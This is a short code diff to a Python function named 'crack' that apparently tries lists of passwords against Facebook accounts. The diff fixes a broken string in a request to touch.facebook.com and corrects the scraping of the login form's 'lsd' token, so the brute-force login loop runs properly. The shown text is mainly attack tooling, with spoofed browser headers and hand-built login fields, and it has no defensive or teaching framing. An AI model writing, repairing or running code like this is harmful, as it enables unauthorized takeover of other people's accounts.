@@ -139,7 +139,7 @@ def crack(uid, password_list, total_count):
             'fr': fr,
             'dpr': '2.75',
             'wd': '980x1040',}
-            response2 = session.get('https://touch.facebook.com)
+            response2 = session.get('https://touch.facebook.com')
             headers = {
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -204,7 +204,7 @@ def crack(uid, password_list, total_count):
                 "lgnrnd": "080657_LjdH",
                 "locale": "en_GB",
                 "login_source": "comet_headerless_login",
-                "lsd": re.search('name="lsd" value="(.*?)"',str(response.text)).group(1),
+                "lsd": re.search('name="lsd" value="(.*?)"',str(response2.text)).group(1),
                 "next": "",
                 "prefill_contact_point": "",
                 "prefill_source": "",
